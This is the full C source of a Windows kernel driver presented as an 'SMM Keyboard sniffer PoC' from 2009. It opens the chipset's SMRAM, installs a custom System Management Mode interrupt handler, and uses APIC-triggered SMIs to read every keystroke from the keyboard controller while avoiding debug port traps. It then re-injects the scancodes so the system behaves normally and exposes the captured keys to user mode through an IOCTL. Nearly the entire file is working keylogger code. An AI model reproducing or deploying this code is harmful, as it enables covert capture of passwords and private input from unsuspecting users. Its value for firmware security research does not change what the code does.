/* inp.c
 *
 * 	- SMM Keyboard sniffer PoC -
 *
 * 	:: Intel Core-duo (one processor in the vmware)
 * 	:: VMware Workstation 6.0.0 build-45731
 * 	:: Intel 82443BX Host bridge/controller - vmware chipset
 * 	:: Windows Professional SP3
 *
 *
 * 	Control flow description
 *
 * 	0. Sniffer disables 8042 Interrupt.
 * 	1. User press a key.
 * 	2. 8042 output buffer activated.
 * 	3. Sniffer entering to the SMM 
 * 	   via Local APIC Self IPI with delivery mode SMI[010b]
 * 	4. SMI Handler read from 0x60 and write to the 0x00000000
 * 		because now in the SMM, not in the protected mode,
 * 		debug 0x60 port trap doesn't activated
 * 	5. Exit SMM
 * 	6. Sniffer read a scancode from 0x00000000
 * 	7. Regenerate scancode and pass the flow to the OS
 * 	8. Do what you want :)
 *
 *
 * 	Last update :: 1. 23. 2009
 *
 * 	http://beist.org
 * 	researcher :: chpie@naver.com
 *
 */
#include <ntddk.h>
#include "inp.h"

// Function prototypes
VOID DrvUnload(IN PDRIVER_OBJECT);
NTSTATUS DriverEntry(IN PDRIVER_OBJECT, IN PUNICODE_STRING);
NTSTATUS IoDeviceControl(IN PDEVICE_OBJECT, IN PIRP);
NTSTATUS IoReadWrite(IN	PDEVICE_OBJECT, IN PIRP);
NTSTATUS IoDispatch(IN PDEVICE_OBJECT, IN PIRP);
#define InpLocalAPICConnection()    Initialization(InpLocalAPICConnection_stage2)
#define InpLocalAPICDisconnection() Initialization(InpLocalAPICDisconnection_stage2)
void InpLocalAPICConnection_stage2(IN PKDPC, IN PVOID, IN PVOID, IN PVOID);
void InpLocalAPICDisconnection_stage2(IN PKDPC, IN PVOID, IN PVOID, IN PVOID);

/*
 *
 *      Structures
 *
 */
#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DrvUnload)
#pragma alloc_text(PAGE, IoDeviceControl)
#pragma alloc_text(PAGE, IoReadWrite)
#pragma alloc_text(PAGE, IoDispatch)
#endif

#define NT_DEVICE_NAME  L"\\Device\\INP" // device name and symbolic link name
#define DOS_DEVICE_NAME L"\\DosDevices\\INP"

#define IOCTL_REQUEST_DATA        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_REGISTER_EVENT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define OUTPUT_BUFFER_FULL 0x1
#define INPUT_BUFFER_FULL  0x2
#define MOUSE_OUTPUT_BUFFER_FULL 0x20
#define BUFFER_FULL   (OUTPUT_BUFFER_FULL|MOUSE_OUTPUT_BUFFER_FULL)

/*
 *
 *
 *  	Global Variables.
 *
 */

PDEVICE_EXTENSION globalPdx; // backup pointer;

// communication
PKEVENT pEvent = NULL;
UCHAR   data[2];

// MP control
long allProcessorDone;

// Physical Control
PUCHAR * LocalAPICGate; // mapped physical [rdmsr IA32_APIC_BASE] by the InpLocalAPICConnection()
PULONG IOAPICGate;
PUCHAR SMMGate;

/*
 *
 *          	Codes
 *
 */

void InpSMMGateConnection(PUCHAR * MappedVirtualVariable)
{
	PHYSICAL_ADDRESS DATA_AREA;
	
	//
	//  Connect physical memory 0x000000000 to [MappedVirtualVariable]
	//
	
	DATA_AREA.HighPart = 0;
	DATA_AREA.LowPart = 0x00000000;
	*MappedVirtualVariable = MmMapIoSpace(DATA_AREA, 0x20, MmNonCached);
}

void InpSMMGateDisconnection(PUCHAR * MappedVirtualVariable)
{
	MmUnmapIoSpace(*MappedVirtualVariable, 0x20);
}

void InpIOAPICConnection(unsigned long ** MappedVirtualVariable)
{
	PHYSICAL_ADDRESS IOAPIC_AREA;     // i/o apic mapped pointer
	
	//
	//  Connect physical memory 0xfec00000 to [MappedVirtualVariable]
	//
	
	IOAPIC_AREA.HighPart = 0;
	IOAPIC_AREA.LowPart = 0xFEC00000;
	*MappedVirtualVariable = MmMapIoSpace(IOAPIC_AREA, 0x20, MmNonCached);
}

void InpIOAPICDisconnection(unsigned long ** MappedVirtualVariable)
{
	MmUnmapIoSpace(*MappedVirtualVariable, 0x20);
}

void InpLocalAPICConnection_stage2(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	unsigned long i = KeGetCurrentProcessorNumber();
	PHYSICAL_ADDRESS LOCAL_APIC_AREA;     // local apic mapped pointer
	ULONG msrLow; 

	//
	//  Connect Local_Apic's Base address to [MappedVirtualVariable]
	//
	_asm
	{
		pushfd
		pushad
		mov ecx, 0x1b
		rdmsr
		mov msrLow, eax
		and msrLow, 0xFFFFF000
		popad
		popfd
	}

	LOCAL_APIC_AREA.HighPart = 0;
	LOCAL_APIC_AREA.LowPart = msrLow;

	LocalAPICGate[i] = MmMapIoSpace(LOCAL_APIC_AREA, 0x400, MmNonCached);

	KdPrint(("Processor [%d], APIC_BASE :: %.8x, VIRTUAL :: %.8x\n", i, msrLow, LocalAPICGate[i]));
	InterlockedIncrement(&allProcessorDone);
}

void InpLocalAPICDisconnection_stage2(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	unsigned long i = KeGetCurrentProcessorNumber();
	MmUnmapIoSpace(LocalAPICGate[i], 0x400);

	KdPrint(("Processor [%x] :: MmUnmapIoSpace() Complete.\n", i));
	InterlockedIncrement(&allProcessorDone);
}

void Initialization(VOID (*FunctionPointer)(IN PKDPC, IN PVOID, IN PVOID, IN PVOID))
{
	/*
	 *	Parallel Execution with Processor affinity - MP Support
	 */
	CCHAR i;
	long currentProcessor;
	PKDPC pkDpc;
	KIRQL oldIrql, currentIrql;
	
	currentIrql = KeGetCurrentIrql();
	
	if (currentIrql < DISPATCH_LEVEL)
		KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

	InterlockedAnd(&allProcessorDone, 0);

	pkDpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, KeNumberProcessors * sizeof(KDPC), (ULONG)' pni');
	
	if (!pkDpc)
	{
		KdPrint(("Insufficient Resource error\n"));
		return;
	}

	currentProcessor = KeGetCurrentProcessorNumber();

	for (i = 0; i < KeNumberProcessors; i++)
	{
		KeInitializeDpc(&pkDpc[i],
				FunctionPointer,
				NULL);
		KeSetTargetProcessorDpc(&pkDpc[i], i);
		KeInsertQueueDpc(&pkDpc[i], NULL, NULL);
	}

	// wait for all of the processor's hooking initialization.
	while(InterlockedCompareExchange(&allProcessorDone, KeNumberProcessors - 1, KeNumberProcessors - 1) != KeNumberProcessors - 1)
	{
		_asm pause;
	}
	
	if (currentIrql < DISPATCH_LEVEL)
		KeLowerIrql(oldIrql);

	if (pkDpc)
	{
		ExFreePool(pkDpc);
		pkDpc = NULL;
	}
}

void InpSMRAMConnection(unsigned char ** MappedVirtualVariable)
{
	PHYSICAL_ADDRESS SMRAM_AREA;

	SMRAM_AREA.HighPart = 0;
	SMRAM_AREA.LowPart = 0xA8000;
	
	*MappedVirtualVariable = MmMapIoSpace(SMRAM_AREA, 0x0FFFU, MmNonCached);
}

void InpSMRAMDisconnection(unsigned char ** MappedVirtualVariable)
{
	MmUnmapIoSpace(*MappedVirtualVariable, 0x0FFFU);
}

ULONG InpRawPCIConfigurationRead(PCI_CONFIGURATION_PACKET pciDev, int offset)
{
	pciDev |= offset & 0xFC;
	WRITE_PORT_ULONG((PULONG)0xCF8, pciDev);
	return READ_PORT_ULONG((PULONG)0xCFC);
}

void InpRawPCIConfigurationWrite(PCI_CONFIGURATION_PACKET pciDev, int offset, ULONG data)
{
	pciDev |= offset & 0xFC;
	WRITE_PORT_ULONG((PULONG)0xCF8, pciDev);
	WRITE_PORT_ULONG((PULONG)0xCFC, data);
}

void InpRawPCIConfigurationPacketInitialization(OUT PPCI_CONFIGURATION_PACKET pDev, int bus, int device, int function)
{
	/*
	 *	from phrack, volume 0x0c, issue 0x41, phile #0x07 of 0x0f
	 *	[System management mode hack] - BSDaemon
	 */
	*pDev = 0x80000000L | ((bus & 0xFF) << 16)  |
		((((unsigned)device) & 0x1F) << 11) |
		((((unsigned)function) & 0x07) << 8);
}

void InpOpenSMRAM(void)
{
	/*
	 *	Intel 82443BX Host bridge/controller - VMware chipset
	 *
	 *	SMRAM - System management RAM Control Register
	 *
	 *	Address offset : 0x72
	 *	Default value  : 0x02
	 *	Access         : Read/write
	 *	Size           : 8 bits
	 */
#define D_OPEN_BIT      (0x010000 << 6)
#define D_CLS_BIT       (0x010000 << 5)
#define D_LCK_BIT       (0x010000 << 4)
#define G_SMRAME_BIT    (0x010000 << 3)
#define C_BASE_SEG2_BIT (0x010000 << 2)
#define C_BASE_SEG1_BIT (0x010000 << 1)
#define C_BASE_SEG0_BIT (0x010000)

	PCI_CONFIGURATION_PACKET dev;
	ULONG SMRAMControl;

	InpRawPCIConfigurationPacketInitialization(&dev, 0, 0, 0);

	KdPrint(("1. SMRAMC origin :: 0x%.2X", InpRawPCIConfigurationRead(dev, 0x70) >> 8));

	// Open a SMRAM area
	SMRAMControl = InpRawPCIConfigurationRead(dev, 0x70);
	SMRAMControl = (SMRAMControl | G_SMRAME_BIT | D_OPEN_BIT) & ~(D_CLS_BIT);
	InpRawPCIConfigurationWrite(dev, 0x70, SMRAMControl); // write

	KdPrint(("1. SMRAMC is now :: 0x%.2X", InpRawPCIConfigurationRead(dev, 0x70) >> 8));
}

void InpCloseSMRAM(void)
{
	PCI_CONFIGURATION_PACKET dev;
	ULONG SMRAMControl;

	InpRawPCIConfigurationPacketInitialization(&dev, 0, 0, 0);

	SMRAMControl = InpRawPCIConfigurationRead(dev, 0x70);
	SMRAMControl = (SMRAMControl) & ~(D_OPEN_BIT);
	InpRawPCIConfigurationWrite(dev, 0x70, SMRAMControl);
}

ULONG InpGetKeyboardInterruptVector(void)
{
	ULONG ReturnValue = 0;
	
	// IOREGSEL writing
	IOAPICGate[0] = 0x10 + 2 * 1; // 0x10 + 2 * IRQ, Keyboard's irq is 1
	// read IOWIN
	ReturnValue = IOAPICGate[4] & 0xFF;

	if (!ReturnValue)
	{
		KdPrint(("GetKeyboardInterruptVector() failed. i'll use the default vector 0x93."));
		ReturnValue = 0x93; // default ps/2 keyboard vector on wintelXP
	}
	
	return ReturnValue;
}

__declspec(naked) void InpSMIHandler(void)
{
	/*
	 * 	System Management interrupt (#SMI) handler
	 *
	 * 	Communication with protected mode system 
	 * 	by using physical memory 0x00000000-0x00000002
	 */

	__asm
	{
		_emit 0x66; // operand-size prefix
		xor eax, eax

		in al, 0x60

		mov ah, 0x1 // dirty sign
		mov word ptr ds:[0x00], ax

		_emit 0x0F; // rsm
		_emit 0xAA;
	}
}

void InstallSMIHandler(void)
{
	PCI_CONFIGURATION_PACKET dev;
	PUCHAR pSMRAM = NULL; // SMRAM Mapping pointer
	int i;

	InpSMRAMConnection(&pSMRAM);
	KdPrint(("1. ----------- SMRAM Open() ------------\n"));

	InpOpenSMRAM();
	for (i = 0; i < 5 * 0x10; i += 0x10)
	{
		KdPrint(("1. %.8X %.8X %.8X %.8X\n",
				*(PULONG)(pSMRAM + 0x00 + i), *(PULONG)(pSMRAM + 0x04 + i),
				*(PULONG)(pSMRAM + 0x08 + i), *(PULONG)(pSMRAM + 0x0c + i)));
	}
	//
	memcpy(pSMRAM, (PUCHAR)InpSMIHandler, 0x50);
	//
	KdPrint(("1. ----------- SMRAM Close() ------------\n"));

	InpSMRAMDisconnection(&pSMRAM);
	InpCloseSMRAM();
}

char ReadOutputBuffer(char * status, PKEVENT kill)
{
	LARGE_INTEGER delayTime = RtlConvertLongToLargeInteger(-6000); // (n * 100) nano-seconds
	int count;
	char dummy, ret = 0;

	for (count = 0; count < 0xA0000 && !KeReadStateEvent(kill); count++)
	{
		dummy = READ_PORT_UCHAR((PUCHAR)0x64);

		if ((dummy & BUFFER_FULL) == OUTPUT_BUFFER_FULL)
		{
			// 0x60 read point
			/*
			 * 	 - ICR lower doubleword -
			 * 	High32 = destination | reserved
			 *	Low 32 = 00 xx 00 x 0 0 010 00000000
			 *
			 * 	Vector :: 0x00
			 *	Delivery mode :: SMI
			 *	Destination mode :: Physical
			 *	Delivery status :: read-only()
			 *	x
			 *	Level :: ignored
			 *	Trigger mode :: ignored
			 *	x
			 *	Destination shorthand :: No shorthand
			 *		:: because [Self with delivery mode SMI#] is undefined behavior,
			 */
			*(PULONG)(LocalAPICGate[0] + 0x0310) = 0x00;
			*(PULONG)(LocalAPICGate[0] + 0x0300) = 0x200;

			while(SMMGate[1] != 0x1)
			{
				_asm pause;
			}
			SMMGate[1] = 0x00;
			ret = SMMGate[0];

			break;
		}

		KeDelayExecutionThread(KernelMode, FALSE, &delayTime);
	}

	if (count == 0xA0000)
	{
		*status = -1; // | Reject
	}
	else if (KeReadStateEvent(kill))
	{
		*status = -1;
		ret = -1;
	}
	else
	{
		*status = dummy;
	}

	return ret;
}

int GenerateScancode(char scancode)
{
	int count = 0xA0000;

	while(--count > 0 && (READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	if (!count) return -1;
	WRITE_PORT_UCHAR((PUCHAR)0x64, 0xD2); // Generate a scancode

	count = 0xA0000;
	while(--count > 0 && (READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	if (!count) return -1;
	WRITE_PORT_UCHAR((PUCHAR)0x60, scancode); // Put a Value

	// wait until drain
	while(!(READ_PORT_UCHAR((PUCHAR)0x64) & OUTPUT_BUFFER_FULL));

	return 0;
}

void ThreadProc(PDEVICE_EXTENSION pdx) // IRQL equals to PASSIVE_LEVEL
{
 	static unsigned char engine[] = { 0xCD, 0x00, 0xC3 }; // int xx, ret
 	unsigned char kccByte; // 0  XLATE  ME  KE  IGNLK  SYSF  MIE  KIE //
	LARGE_INTEGER delayTime = RtlConvertLongToLargeInteger(-6000); // (n * 100) nano-seconds

	//--------------------------------------------------------------------------
	// Write Keyboard controller RAM - disabling keyboard output buffer interrupt
	//
	kccByte = 0x46; // disable KIE bit

	while((READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	WRITE_PORT_UCHAR((PUCHAR)0x64, 0x60); // Write KCCB

	while((READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	WRITE_PORT_UCHAR((PUCHAR)0x60, kccByte);
	//--------------------------------------------------------------------------
	//Inp_Mask_KeyboardInterrupt(); // Double-Blocking

	//
	// Polling
	//
	while(!KeReadStateEvent(&pdx->kill))
	{
		if  (KeGetCurrentIrql() == PASSIVE_LEVEL)
		{
			if ((data[0] = ReadOutputBuffer(&data[1], &pdx->kill)) == -1) break;

			if (data[1] != -1)
			{
				if (pEvent)
					KeSetEvent(pEvent, 0, 0);

				if (GenerateScancode(data[0]))
					KdPrint(("inp :: GenerateScancode() Timeout"));

				// Gate Firing - A Keyboard press event emulator
				// 
				//
				//  INT instruction
				//
				//  0xCD imm8 - Interrupt vector number specified by immediate byte.
				//
				engine[1] = (unsigned char)InpGetKeyboardInterruptVector();
				((void (*)(void))engine)(); // <-- Execute _asm INT InpGetKeyboardInterruptVector();
			}		

			KeDelayExecutionThread(KernelMode, FALSE, &delayTime);
		}
	}

	//Inp_Unmask_KeyboardInterrupt();
	//--------------------------------------------------------------------------
	// Write Keyboard controller RAM - enabling keyboard output buffer interrupt
	//
	kccByte = 0x47;

	while((READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	WRITE_PORT_UCHAR((PUCHAR)0x64, 0x60); // Write KCCB

	while((READ_PORT_UCHAR((PUCHAR)0x64) & INPUT_BUFFER_FULL));
	WRITE_PORT_UCHAR((PUCHAR)0x60, kccByte);
	//--------------------------------------------------------------------------
		
	PsTerminateSystemThread(STATUS_SUCCESS);
}

void StopThread(PDEVICE_EXTENSION pdx)
{
	KeSetEvent(&pdx->kill, 0, FALSE);
	KeWaitForSingleObject(pdx->hThread, Executive, KernelMode, FALSE, NULL);
	ObDereferenceObject(pdx->hThread);
}

NTSTATUS StartPollThread(PDEVICE_EXTENSION pdx)
{
	//
	// Programming the Windows Driver Model - p. 764 : Polling device
	//
	NTSTATUS status;
	HANDLE hThread;
	OBJECT_ATTRIBUTES oa;
    	KAFFINITY threadAffinityMask = 0x1; // Processor ID 0

	KeInitializeEvent(&pdx->kill, NotificationEvent, FALSE);
	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

	status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &oa, NULL, NULL, (PKSTART_ROUTINE)ThreadProc, pdx);

	if (!NT_SUCCESS(status))
		return status;
	
    	status = ZwSetInformationThread(hThread, ThreadAffinityMask, &threadAffinityMask, sizeof(KAFFINITY));

	if (!NT_SUCCESS(status))
		return status;

	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pdx->hThread, NULL);

	ZwClose(hThread);

	return STATUS_SUCCESS;
}

/*
 *
 *					 Driver Template
 *
 */

VOID DrvUnload(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT pDeviceObject;
	UNICODE_STRING uniWin32NameString;

	StopThread(globalPdx);

	InpSMMGateDisconnection(&SMMGate);
	InpLocalAPICDisconnection();
	InpIOAPICDisconnection(&IOAPICGate);

	if (LocalAPICGate)
		ExFreePool(LocalAPICGate);

	pDeviceObject = pDriverObject->DeviceObject;

	RtlInitUnicodeString( &uniWin32NameString, DOS_DEVICE_NAME );
	IoDeleteSymbolicLink( &uniWin32NameString );
	IoDeleteDevice( pDriverObject->DeviceObject );
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{
	PDEVICE_OBJECT pDeviceObject = NULL;
	NTSTATUS ntStatus;
	UNICODE_STRING uniNtNameString, uniWin32NameString;
	int i;

	RtlInitUnicodeString( &uniNtNameString, NT_DEVICE_NAME );
	ntStatus = IoCreateDevice (
		    pDriverObject,
		    sizeof(DEVICE_EXTENSION),	// DeviceExtensionSize
                    &uniNtNameString,
                    FILE_DEVICE_UNKNOWN,	// 
                    0,				// No standard device characteristics
                    FALSE,			// not exclusive device
                    &pDeviceObject
                    );
	if( !NT_SUCCESS(ntStatus) )
	{
		return ntStatus;
	}

	globalPdx = pDeviceObject->DeviceExtension;

	// create dispatch points for create/open, close, unload
	pDriverObject->DriverUnload = DrvUnload;

	RtlInitUnicodeString( &uniWin32NameString, DOS_DEVICE_NAME );
	ntStatus = IoCreateSymbolicLink( &uniWin32NameString, &uniNtNameString );
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice( pDriverObject->DeviceObject );
	}

	for( i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++ )
		pDriverObject->MajorFunction[i] = IoDispatch;
	
	pDriverObject->MajorFunction[IRP_MJ_READ]	    = 
	pDriverObject->MajorFunction[IRP_MJ_WRITE]	    = IoReadWrite;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoDeviceControl;

	/////                            /////
	//                                  //
	//             Start!!!             //
	//                                  //
	/////                            /////
	i = KeNumberProcessors * sizeof(PULONG);
	LocalAPICGate = (PUCHAR *)ExAllocatePoolWithTag(NonPagedPool, i, (ULONG)' pni');
	RtlZeroMemory(LocalAPICGate, i);

	InpIOAPICConnection(&IOAPICGate);
	InpLocalAPICConnection();
	InstallSMIHandler();

	InpSMMGateConnection(&SMMGate);
	StartPollThread(globalPdx);

	return STATUS_SUCCESS;
} //DriverEntry

NTSTATUS IoDispatch(IN PDEVICE_OBJECT pDeviceObject, IN	PIRP pIrp)
{
	NTSTATUS iStatus = STATUS_SUCCESS;

	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= 0;
	IoCompleteRequest( pIrp, IO_NO_INCREMENT );
	return iStatus;
}

NTSTATUS IoDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS			iStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION		pStack;
	ULONG				iTransfered = 0;

	HANDLE hEvent;
	
  	pStack = IoGetCurrentIrpStackLocation(pIrp);
	
	switch( pStack->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_REGISTER_EVENT:
			hEvent = * (PHANDLE) pIrp->AssociatedIrp.SystemBuffer;
			iStatus = ObReferenceObjectByHandle(hEvent, EVENT_MODIFY_STATE, *ExEventObjectType, pIrp->RequestorMode, (PVOID *)&pEvent, NULL);
			break;
			
		case IOCTL_REQUEST_DATA:
			memcpy( (void *)pIrp->AssociatedIrp.SystemBuffer, (const void *)data, sizeof(char [2]));
			iTransfered = sizeof(char [2]);
			break;

		default:
			iStatus = STATUS_INVALID_PARAMETER;
			break;
	}

	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= iTransfered;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	
	return iStatus;
}

NTSTATUS IoReadWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS			iStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION		pStack;
	ULONG				iTransfered = 0;

	pStack = IoGetCurrentIrpStackLocation(pIrp);
	
	pIrp->IoStatus.Status		= iStatus;
	pIrp->IoStatus.Information	= iTransfered;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	
	return iStatus;
}
